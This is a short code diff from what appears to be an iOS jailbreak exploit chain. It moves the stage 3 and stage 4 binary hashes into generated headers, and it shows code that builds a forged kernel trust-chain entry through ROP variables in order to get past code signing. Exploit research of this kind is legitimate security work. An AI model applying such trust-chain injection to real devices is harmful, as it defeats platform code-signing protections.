@@ -11,6 +11,9 @@
 #include "stage2.h"
 #include "stage1.h"
 
+#include "stage2_hash3.h"
+#include "stage2_hash4.h"
+
 
 // TODO: move that whole buidling part into another file and integrate rop_chain_debug into rop_chain
 // get an address of a specific rop variable (basically rop var name to address)
@@ -688,8 +691,8 @@ void stage2(jake_img_t kernel_symbols, offset_struct_t * offsets,char * base_dir
 	snprintf((char*)&new_entry->uuid,16,"TURNDOWNFORWHAT?");
 	new_entry->count = 2;
 	// YOU NEED TO UPDATE THESE TWO HASHES WHEN YOU RECOMPILE STAGE 3 OR STAGE 4 respectivly
-	hash_t my_dylib_hash = {0x1b,0x99,0xa5,0x2e,0x73,0x82,0x43,0x79,0x66,0x16,0x4a,0x39,0x65,0x96,0xcc,0x5e,0x71,0xac,0x74,0xe5}; // stage 3 hash
-	hash_t my_binary_hash = {0xb0,0xc0,0xab,0xc1,0x8b,0x05,0x5b,0x89,0x55,0x3f,0x48,0x57,0xde,0x35,0x5f,0xaf,0x20,0x5a,0x3f,0xe6}; // stage 4 hash
+	hash_t my_dylib_hash = STAGE2_HASH3; // stage 3 hash
+	hash_t my_binary_hash = STAGE2_HASH4; // stage 4 hash
 	memcpy(&new_entry->hash[0],my_dylib_hash,20);
 	memcpy(&new_entry->hash[1],my_binary_hash,20);
 	DEFINE_ROP_VAR("new_trust_chain_entry",sizeof(struct trust_chain),new_entry);
